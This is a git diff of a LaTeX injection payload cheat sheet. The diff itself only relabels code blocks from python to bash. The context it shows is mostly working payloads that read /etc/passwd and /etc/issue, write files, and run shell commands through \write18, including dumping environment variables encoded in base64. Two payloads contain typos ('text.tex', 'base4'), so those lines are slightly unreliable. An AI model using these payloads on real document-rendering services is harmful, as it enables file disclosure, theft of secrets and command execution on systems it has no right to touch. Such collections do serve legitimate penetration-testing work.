@@ -1,13 +1,13 @@
 # LaTex Injection
 
 ## Read file
-```python
+```bash
 \input{/etc/passwd}
 \include{password} # load .tex file
 ```
 
 Read single lined file
-```python
+```bash
 \newread\file
 \openin\file=/etc/issue
 \read\file to\line
@@ -16,7 +16,7 @@ Read single lined file
 ```
 
 Read multiple lined file
-```python
+```bash
 \newread\file
 \openin\file=/etc/passwd
 \loop\unless\ifeof\file
@@ -27,7 +27,7 @@ Read multiple lined file
 ```
 
 ## Write file
-```python
+```bash
 \newwrite\outfile
 \openout\outfile=cmd.tex
 \write\outfile{Hello-world}
@@ -36,17 +36,17 @@ Read multiple lined file
 
 ## Command execution
 The input of the command will be redirected to stdin, use a temp file to get it.
-```python
+```bash
 \immediate\write18{env > output}
 \input{output}
 ```
 If you get any LaTex error, consider using base64 to get the result without bad characters
-```python
+```bash
 \immediate\write18{env | base64 > test.tex}
 \input{text.tex}
 ```
 
-```python
+```bash
 \input|ls|base4
 ```
 
